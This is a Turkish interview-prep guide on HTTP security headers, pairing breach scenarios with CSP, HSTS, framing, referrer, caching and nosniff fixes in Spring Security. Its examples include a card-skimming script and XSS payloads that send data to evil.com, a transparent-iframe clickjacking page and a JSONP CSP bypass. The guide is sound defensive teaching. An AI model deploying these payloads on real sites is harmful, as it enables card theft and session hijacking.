# 09e — HTTP Security Headers: Mülakat Soruları & Gerçek Hayat Sorunları

---

## Bölüm 1: CSP & XSS Savunması

### Gerçek Hayat Sorunları

---

**Sorun 1: CSP olmadan stored XSS — 3rd party script CDN üzerinden enjekte edildi**

```
Senaryo:
  Büyük e-ticaret sitesi: CSP header yok.
  Ürün yorumları: sanitizasyon var, stored XSS engellendi.
  Ama 3rd party analytics CDN compromise edildi.

  Mevcut HTML:
    <script src="https://cdn.analytics-partner.com/tracker.js"></script>
    // CDN'e güveniyorlar — internal security review'dan geçmedi.

  Saldırı (2018 British Airways benzeri vaka):
    cdn.analytics-partner.com hack'lendi.
    tracker.js içine eklendi:
      setInterval(function() {
        var cards = document.querySelectorAll('input[name*="card"]');
        cards.forEach(c => fetch('https://evil.com/c?v=' + c.value));
      }, 500);
    
    Ödeme formundaki kart numaraları 500ms'de bir evil.com'a gönderildi.
    Tespit: 2 hafta sonra.
    Zarar: 500,000 kart verisi sızdı.

  Neden CSP olsaydı:
    Content-Security-Policy: script-src 'self' https://cdn.analytics-partner.com;
    cdn.analytics-partner.com içeriği değişse bile:
    eval(), inline script → engellendi.
    fetch('https://evil.com/...') → connect-src 'self' → engellendi!
    connect-src: fetch/XHR hangi domain'e gidebilir kontrolü.

Doğru CSP:
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://cdn.analytics-partner.com;
    connect-src 'self' https://api.myshop.com;  ← evil.com engellendi!
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';

  // Spring Security
  .contentSecurityPolicy(csp -> csp.policyDirectives(
      "default-src 'self'; " +
      "script-src 'self' https://cdn.analytics-partner.com; " +
      "connect-src 'self' https://api.myshop.com; " +
      "object-src 'none'; frame-ancestors 'none'"
  ))

  Öğrenim: CDN güveni de sınırlı olmalı. connect-src eksikse:
    script kaynağı kısıtlı olsa bile → zararlı script çalışıp
    kısıtlanmamış bir endpoin'e veri gönderebilir.
```

---

**Sorun 2: CSP'de `unsafe-inline` ve `unsafe-eval` — tüm koruma anlamsız hale geldi**

```
Senaryo:
  Geliştirici CSP ekledi ama çalışmayan legacy widget için ödün verdi:

  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'

  Sorun:
    'unsafe-inline': tüm inline script'lere izin verilir.
    XSS payload'ı: <script>stealData()</script> → çalışır! CSP korumaz.
    'unsafe-eval': eval(), setTimeout("string") → çalışır.
    
  Saldırı bypass:
    Normal XSS yorum alanında:
    <script>fetch('evil.com?c='+document.cookie)</script>
    CSP var ama unsafe-inline nedeniyle → CSP hiçbir şeyi engellemedi.

  Gerçek etki:
    SecurityHeaders.com: F skoru (unsafe-inline/eval ile A+ imkansız).
    Pentest bulgusu: "CSP mevcut ama etkisiz — bypass edilebilir."

Düzeltme (nonce ile unsafe-inline'ı kaldır):
  // Her request'te unique nonce üret
  @Component
  public class CspNonceFilter implements Filter {
      @Override
      public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
              throws IOException, ServletException {
          byte[] seed = SecureRandom.getInstanceStrong().generateSeed(16);
          String nonce = Base64.getEncoder().encodeToString(seed);
          
          ((HttpServletRequest) req).setAttribute("cspNonce", nonce);
          ((HttpServletResponse) res).addHeader("Content-Security-Policy",
              "default-src 'self'; " +
              "script-src 'self' 'nonce-" + nonce + "' 'strict-dynamic'; " +
              "object-src 'none'; base-uri 'self'");
          
          chain.doFilter(req, res);
      }
  }

  // Thymeleaf template
  <script th:nonce="${cspNonce}">
    // Bu script çalışır — nonce eşleşiyor
    initApp();
  </script>

  // XSS payload (nonce olmadan):
  <script>stealData()</script>  → CSP reddeder! Nonce yok.

  'strict-dynamic':
    Nonce'lu script → dinamik olarak eklediği script'lere de güvenilir.
    Whitelist'e her CDN URL'sini eklemek yerine: nonce'lu ana script → trust.
    Legacy allowlist'ler 'strict-dynamic' ile override edilir.

  Kademeli geçiş:
    1. Content-Security-Policy-Report-Only ekle (prod kırmaz)
    2. İhlalleri topla (report-to endpoint)
    3. Kademeli düzelt (unsafe-inline → nonce)
    4. Enforce moduna geç
```

---

**Sorun 3: HSTS max-age çok kısa ayarlandı — SSL stripping saldırısı başarılı oldu**

```
Senaryo:
  HSTS eklendi ama max-age test için kısa bırakıldı:
  Strict-Transport-Security: max-age=60

  Kafe Wi-Fi saldırısı (Man-in-the-Middle / SSL Stripping):
    Saldırgan: kafe Wi-Fi routerını kontrol ediyor (ARP poisoning).
    Kurban tarayıcısında: https://mybank.com bookmark'ı tıklıyor.
    
    Senaryo: HSTS var, max-age=60 saniye.
    Kurban dün ziyaret etti → HSTS cache süresi doldu (60 sn geçti).
    Bugün saldırgan araya girdi: HTTP → HTTPS redirect'i kesiyor.
    sslstrip: https://mybank.com → http://mybank.com (padlock yok).
    Kurban fark etmedi → kimlik bilgilerini girdi → saldırgan gördü.

  HSTS olsaydı (max-age=31536000):
    Tarayıcı: "mybank.com için 1 yıllık HSTS kaydı var."
    HTTP isteği → tarayıcı server'a bile gitmeden HTTPS'e çevirir.
    Saldırgan: HTTP bağlantıyı araya alamaz — tarayıcı HTTP'ye gitmez.

  includeSubDomains eksikliği:
    login.mybank.com → HSTS kapsamına girmiyor.
    Saldırgan: login subdomain'ine HTTP ile bağlantıyı araya alır.
    Cookie: domain=.mybank.com → login.mybank.com'daki cookie → çalındı.

Doğru HSTS:
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

  Kurulum sırası (geri dönüşü zor — dikkatli ol!):
    1. Tüm subdomainler HTTPS → sağlandı mı?
    2. HTTP → HTTPS redirect tüm subdomainlerde var mı?
    3. Sertifika geçerli mi, expire tarihi izleniyor mu?
    4. max-age=300 (5 dk) → test et → sorun yok mu?
    5. max-age=86400 (1 gün) → gözlemle.
    6. max-age=31536000; includeSubDomains.
    7. hstspreload.org → tarayıcı built-in listesine ekle.
    
  Preload kritik önemi:
    HSTS olmadan ilk HTTP isteği → savunmasız (TOFU).
    Preload: tarayıcı siteni hiç HTTP'yle denemez — built-in liste.
    Chrome, Firefox, Safari: preload listesini bilir.

  Dikkat: Yanlış subdomain'de HTTPS yoksa → includeSubDomains ekleyince erişilmez!
```

---

**Sorun 4: Clickjacking — iframe ile şeffaf overlay, kullanıcı farkında olmadan tıklatıldı**

```
Senaryo:
  Sosyal medya platformu: X-Frame-Options header'ı yok.

  evil.com sayfası:
  <html>
  <body>
    <!-- Gerçek: evil site düğmesi görünüyor -->
    <div style="position:absolute; z-index:1; top:100px; left:200px">
      ÜCRETSİZ İPHONE KAZAN! →
    </div>

    <!-- Şeffaf iframe: platform.com/follow?user=hacker -->
    <iframe
      src="https://platform.com/actions/follow?userId=hacker123"
      style="opacity:0.001; position:absolute; top:100px; left:200px;
             width:200px; height:50px; z-index:2">
    </iframe>
  </body>
  </html>

  Kurban:
    evil.com'da "ÜCRETSİZ İPHONE KAZAN!" butonuna tıkladı.
    Aslında: platform.com/follow API'sine tıkladı (şeffaf iframe).
    platform.com: cookie ile authenticated → follow işlemi gerçekleşti.
    Hacker hesabı: binlerce kullanıcı takipçi kazandı.

  Banka örneği:
    İframe: mybank.com/transfer?to=hacker&amount=5000
    Kullanıcı "Devam" butonuna tıkladı → transfer gerçekleşti.

  X-Frame-Options header yok → iframe gömme mümkün.

Düzeltme:
  X-Frame-Options: DENY
  // Asla iframe olarak gömülemez.

  Veya modern CSP alternatifi (daha esnek):
  Content-Security-Policy: frame-ancestors 'none';
  // frame-ancestors CSP direktifi — X-Frame-Options'ın superset'i.
  // ALLOW-FROM (deprecated) yerine: frame-ancestors https://partner.com;

  // Spring Security
  .frameOptions(frame -> frame.deny())
  // Veya CSP ile:
  "frame-ancestors 'none'"

  Ne zaman SAMEORIGIN?
    /admin paneli → analytics iframe kendi domain'inden geliyor.
    X-Frame-Options: SAMEORIGIN → sadece aynı origin iframe kullanabilir.

  Partner entegrasyonu (ödeme widget'ı):
    Frame: https://payment-widget.partner.com → kendi siteni frame'e koyuyor.
    CSP: frame-ancestors https://payment-widget.partner.com;
    X-Frame-Options: ALLOW-FROM → deprecated (CSP kullan).
```

---

**Sorun 5: Referrer-Policy eksik — admin URL'leri analytics servisine sızdı**

```
Senaryo:
  Şirket içi araç: Referrer-Policy header'ı yok.
  Default: full URL referrer gönderilir (unsafe-url davranışı).

  Yönetici paneli URL'leri:
    https://internal.myapp.com/admin/users?filter=suspended&exportToken=abc123
    https://internal.myapp.com/reports/financial/2025-Q4?secret=xyz

  Admin sayfasında: Google Analytics veya 3rd party widget linki var.
  Yönetici linke tıkladı → tarayıcı isteği:
  
    GET https://analytics.google.com/...
    Referer: https://internal.myapp.com/admin/users?filter=suspended&exportToken=abc123

  Google Analytics log'larında: tam admin URL → exportToken → sessiz credential sızıntısı.
  Analitik aracı: URL pattern'leri topluyor → competitor intelligence.
  GDPR: 3rd party URL log → iç yapı sızdı.

Düzeltme:
  Referrer-Policy: strict-origin-when-cross-origin

  Davranış:
    Aynı origin: full URL gönderilir (internal link — sorun yok).
    Cross-origin (analytics.google.com'a): sadece "https://internal.myapp.com" gönderilir.
    Path + query string gizlendi → exportToken görünmez.

  Diğer değerler:
    no-referrer: hiç referrer gönderme (en kısıtlı — analytics bozulabilir).
    same-origin: sadece aynı origin'e referrer — cross-origin hiç yok.
    strict-origin: HTTPS→HTTPS: origin gönder; HTTPS→HTTP: hiç gönderme.

  Analytics etki:
    Campaign tracking (utm_source, utm_medium) → query param değil, GA URL'yi parse etmez.
    Landing page referrer → origin gönderilir, yeterli.
    Detaylı path → zaten gönderilmemeli (hassas olabilir).

  // Spring Security
  .referrerPolicy(referrer -> referrer
      .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
  )
```

---

**Sorun 6: Cache-Control eksik — kütüphane bilgisayarında hassas veriler geri butonuyla göründü**

```
Senaryo:
  İnternet kafe veya ortak iş bilgisayarı.
  Kullanıcı: banka uygulamasına giriş yaptı, hesap özeti gördü.
  Çıkış yaptı (logout: session invalidate).

  Sonraki kullanıcı:
    Tarayıcı geri butonu → hesap özeti sayfası!
    Neden: Sayfa tarayıcı cache'inde saklanmış.
    Logout: server-side session silindi ama tarayıcı cache'i temizlenmedi.
    Geri butonu: server'a istek atmadan cache'den sayfayı gösteriyor.

  Cache-Control header yok → tarayıcı kendi kararıyla cache'ler.
  Hassas veri: bakiye, hesap numarası, işlem geçmişi → görünür.

  Proxy cache senaryosu:
    Kurumsal proxy → kullanıcının profil sayfasını cache'ledi.
    Aynı ağdan başka kullanıcı aynı URL → proxy cache'den → başkasının verisi!

Düzeltme:
  // Tüm authenticated endpoint'ler için:
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache          // HTTP/1.0 uyumluluğu
  Expires: 0                // Artık süresi dolmuş

  // Spring Security (default: authenticated request için ekler)
  // Ama API response'lar için manuel:
  @GetMapping("/api/account/summary")
  public ResponseEntity<AccountSummary> getSummary() {
      return ResponseEntity.ok()
          .cacheControl(CacheControl.noStore())
          .body(accountService.getSummary());
  }

  // Global filter ile tüm /api/secure/** için:
  @Component
  public class NoCacheFilter implements Filter {
      @Override
      public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
              throws IOException, ServletException {
          HttpServletResponse response = (HttpServletResponse) res;
          response.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
          response.setHeader("Pragma", "no-cache");
          response.setDateHeader("Expires", 0);
          chain.doFilter(req, res);
      }
  }

  Static assets (JS, CSS, resim) için farklı:
    Cache-Control: public, max-age=31536000, immutable
    // 1 yıl cache → performans. Değişince URL hash değişir (app.abc123.js).
    // Hassas sayfa: no-store. Static: max-age uzun. İkisi karıştırılmamalı.
```

---

**Sorun 7: X-Content-Type-Options eksik — JPG olarak yüklenen HTML dosyası XSS'e yol açtı**

```
Senaryo:
  Avatar upload özelliği: sadece JPG kabul ediliyor.
  Server: Content-Type: image/jpeg header'ı ekliyor.
  Ama tarayıcı MIME sniffing yapıyor!

  Saldırgan: "avatar.jpg" adında dosya yüklüyor.
  İçeriği: <!DOCTYPE html><script>fetch('evil.com?c='+document.cookie)</script>
  Gerçekten JPEG değil, HTML!

  Server: "jpg uzantısı → Content-Type: image/jpeg" olarak sunuyor.
  
  Eski tarayıcı (nosniff olmadan):
    İçeriği oku: "Hmm, image/jpeg ama içerik HTML gibi görünüyor."
    MIME sniffing: HTML olarak render eder.
    <script> → çalıştı → XSS!

  Saldırganın yüklediği "resim" → profile sayfasında → tüm kullanıcılara XSS.

Düzeltme:
  X-Content-Type-Options: nosniff

  Tarayıcı: "Server image/jpeg dedi → image/jpeg olarak işle, analiz etme."
  <script> → image context'te → çalışmaz.

  Ek katmanlar (nosniff tek başına yetmez):
    1. Server-side MIME detection (magic bytes):
       Apache Tika ile içerik analizi → gerçekten JPEG mi?
       byte[] header = Files.readAllBytes(path, 4);
       "FFD8FF" (JPEG magic bytes) yoksa → reddet.
    
    2. Upload path: /uploads/ → script-src dışında (başka subdomain veya S3):
       static.myapp.com: Content-Security-Policy: script-src 'none'
       → Upload klasöründen JS çalışamaz.
    
    3. Content-Disposition: attachment (download zorla, render etme):
       Content-Disposition: attachment; filename="avatar.jpg"
       → Tarayıcı render etmez, download eder.

  // Spring Security
  .contentTypeOptions(Customizer.withDefaults())  // nosniff ekler
```

---

### Mülakat Soruları

**Junior / Mid:**

1. HTTP security header'ları neden gereklidir? Uygulama kodu güvenli yazılmışsa yeterli değil mi?

   > **Beklened:** Defense in depth: tek koruma katmanı yetmez. Uygulama kodu güvenli olsa bile: 3rd party script compromise (British Airways), CDN saldırısı. Tarayıcı davranışı: MIME sniffing, iframe gömme, cache — uygulama kodu kontrol edemez. Header'lar tarayıcıya "politika" bildirir — tarayıcı enforce eder. CSP: XSS payload çalıştırılamaz (uygulama kodu çıktıyı escape etse bile 3rd party script compromise durumunda). HSTS: MITM → SSL stripping → uygulama fark edemez ama tarayıcı HTTP'ye gitmez. X-Frame-Options: clickjacking → uygulama kodu göremiyor (kurban başka sitede). X-Content-Type-Options: MIME sniffing → uygulama doğru Content-Type verse bile tarayıcı override edebilir. Header'lar: son savunma hattı. Uygulama hatası + header → zarar sınırlı. Uygulama doğru + header yok → tarayıcı saldırıları açık.

2. HSTS (Strict-Transport-Security) nedir? `preload` parametresi neden önemlidir?

   > **Beklened:** HSTS: tarayıcıya "bu siteye X süre boyunca sadece HTTPS ile bağlan" talimatı. HTTP isteği → tarayıcı server'a gitmeden HTTPS'e çevirir. SSL stripping MITM: saldırgan HTTP bağlantıyı araya alamaz — tarayıcı HTTP yapmıyor. max-age=31536000: 1 yıl. includeSubDomains: alt domainleri de kapsar. TOFU problemi (Trust On First Use): ilk HTTP isteği hâlâ savunmasız. Kullanıcı siteye ilk kez HTTP ile bağlanırsa → HSTS öğrenilmeden önce MITM mümkün. Preload çözümü: tarayıcının (Chrome, Firefox, Safari) dahili listesine site eklenir. İlk ziyarette bile tarayıcı "bu site HTTPS-only" biliyor. hstspreload.org → başvuru gerekiyor. Geri dönüşü zor: preload listesinden çıkmak aylar sürer. Kurulum sırası: küçük max-age ile başla → test → büyüt → includeSubDomains → preload.

3. CSP `report-only` modu neden önce kullanılmalıdır?

   > **Beklened:** CSP yanlış yapılandırılırsa: meşru kaynaklar engellenir → site bozulur. Örnek: script-src 'self' ekledik ama Google Maps API CDN'i unuttuk → harita yüklenmiyor. Production'da kullanıcı haritayı göremedi → destek çağrısı patlaması. Report-Only modu: Content-Security-Policy-Report-Only header. İhlaller → engellenmez, sadece raporlanır. report-to direktifi: ihlal JSON olarak belirtilen endpoint'e POST edilir. Uygulama çalışmaya devam eder, ihlaller toplanır. Süreç: (1) Report-Only ekle → report endpoint'i ayarla. (2) 1-2 hafta log topla: hangi kaynaklar bloklanıyor? (3) İzin verilmesi gerekenler → CSP'ye ekle. (4) Unwanted kaynaklar → bloklanacak (inline script, bilinmeyen CDN). (5) Enforce moduna geç (Content-Security-Policy). Prodda aniden enforce → analistik scriptler kırılır, chat widget yüklenmiyor → gerçek zarar.

4. `X-Content-Type-Options: nosniff` ne işe yarar? Hangi saldırıyı önler?

   > **Beklened:** MIME sniffing: tarayıcı server'ın söylediği Content-Type'ı bazen ignore eder. İçeriğe bakarak "bu aslında HTML gibi görünüyor, HTML olarak render edeyim" diyebilir. Saldırı: image/jpeg diyerek HTML içerikli dosya yükle → tarayıcı HTML render → XSS. nosniff: "Server'ın söylediğine güven, analiz etme." script için: sadece text/javascript kabul. style için: sadece text/css. MIME olmayan script → çalışmaz. Senaryo: avatar upload → Content-Type: image/jpeg → script çalışmaz (nosniff). Ek önlemler: server-side magic bytes kontrolü (gerçekten JPEG mi?), upload klasörüne CSP: script-src 'none', Content-Disposition: attachment. nosniff + bunlar birlikte → MIME sniffing XSS engellendi.

---

**Senior / Architect:**

5. Bir SPA (Single Page Application) için production-ready CSP nasıl tasarlanır?

   > **Beklened:** SPA zorlukları: inline script kullanımı (framework bootstrap), dynamic script yükleme, eval kullanımı (webpack legacy). Nonce yaklaşımı (modern): Her SSR response'unda unique nonce → `script-src 'nonce-abc123' 'strict-dynamic'`. 'strict-dynamic': nonce'lu script → dinamik eklediği script'lere de güven → webpack chunks. Inline event handler'lar: JSX/Angular → event binding DOM'a ekliyor ama JS dosyası içinde → sorun yok. Problematik: onclick="doSomething()" → inline → engellenir → component yaklaşımı. CDN kaynakları: React CDN, Bootstrap → script-src 'self' cdn.jsdelivr.net. Subresource Integrity (SRI): `<script integrity="sha256-abc..." crossorigin>` → CDN compromise olsa integrity check fail → çalışmaz. connect-src: fetch/XHR hedeflerini listele: API, WebSocket, analytics. Report-only önce: ihlalleri topla → kademeli sıkılaştır. Sonuç policy: `default-src 'self'; script-src 'self' 'nonce-{n}' 'strict-dynamic'; connect-src 'self' https://api.myapp.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-ancestors 'none'; object-src 'none'; base-uri 'self'`.

6. Security header'larının tümünü doğru yapılandırsak bile yetersiz kalabileceği bir senaryo var mı?

   > **Beklened:** Header'lar tarayıcı güvenliğidir — server-to-server veya native app'ler etkilenmez. Curl/Postman: CSP, HSTS → hiçbiri uygulanmaz. Server-side SSRF: HSTS tarayıcıda, server başka servise HTTP'yle bağlanıyor → HSTS korumuyor. Mobile native app: HSTS → iOS/Android native client etkilenmez (sistem-level TLS). Bypass senaryoları: subdomain takeover + HSTS includeSubDomains eksik → alt domain saldırgan kontrolünde → XSS. CSP bypass: JSONP endpoint → script-src izinli domain'de JSONP varsa → XSS bypass. `https://api.myapp.com/jsonp?callback=<script>evil()</script>`. 'unsafe-eval' olan framework (AngularJS 1.x) → CSP bypass mevcut. Öneri: Header'lar gerekli ama yeterli değil. Input validation, output encoding, parameterized query, auth — hepsi gerekli. Header'lar: son savunma hattı, tek savunma hattı değil.

---

## Karma — Architect Seviyesi

7. **"Mevcut legacy uygulamaya security header'ları eklemek istiyorsun. Nasıl bir yol izlersin?"**

   > **Beklened:** Risk tespiti: SecurityHeaders.com veya Mozilla Observatory → mevcut skorlar. Hangi header'lar eksik, hangisi yanlış? Önceliklendirme: HSTS → SSL stripping → kritik, ama dikkatli (önce altyapı hazır mı?). X-Frame-Options / CSP frame-ancestors → clickjacking → düşük risk, kolayca ekle. X-Content-Type-Options: nosniff → yan etkisi minimal → hemen ekle. Referrer-Policy: strict-origin-when-cross-origin → analytics etkilemez → ekle. Cache-Control: hassas sayfalara no-store → ekle. CSP → en komplex, en son. Kademeli yaklaşım: (1) Kolay header'lar (nosniff, Referrer-Policy, Permissions-Policy): bir sprint. (2) X-Frame-Options: DENY — iframe kullanan yer var mı? (admin dashboard'da analytics iframe?) → test et. (3) HSTS: altyapı audit → tüm subdomainlerde HTTPS? → max-age=300 başla. (4) CSP Report-Only → 2-4 hafta log → kademeli enforce. Test etme: staging → SecurityHeaders.com → A+ mı? Browser DevTools: Network tab → response headers. Console: CSP ihlalleri kırmızı hata olarak görünür → test.

8. **"CSP, HSTS ve CORS birbirini nasıl tamamlar? Birbirinden farkı nedir?"**

   > **Beklened:** Farklı tehditlere karşı, farklı katmanlarda: CSP (Content Security Policy): tarayıcıya "hangi kaynaklardan içerik yüklenebilir, nereye veri gönderilebilir" → XSS saldırısının etkisini sınırlar. Script çalışsa bile connect-src dışına veri gidemez. Saldırı: XSS, data injection, clickjacking (frame-ancestors). HSTS (HTTP Strict Transport Security): tarayıcıya "bu siteyle sadece HTTPS konuş" → transport katmanı güvenliği. Saldırı: SSL stripping, MITM, protocol downgrade. CORS (Cross-Origin Resource Sharing): tarayıcının SOP'unu esnetir — "hangi domain'den cross-origin istek kabul edilir". Saldırı: unauthorized cross-origin data theft. Birlikte senaryo: CORS strict → evil.com'dan cross-origin istek → engellendi (sunucu reddetti). AMMA: XSS başarılı → aynı origin'den fetch → CORS atlatıldı! CSP connect-src → aynı origin bile olsa evil.com'a veri gönderemez. HSTS → transport güvenli → man-in-the-middle → araya giremez → CORS/CSP token'ı interceptleyemez. Üçü birlikte: CORS (kim erişebilir) + CSP (ne yapabilir) + HSTS (kanal güvenli) → katmanlı savunma.
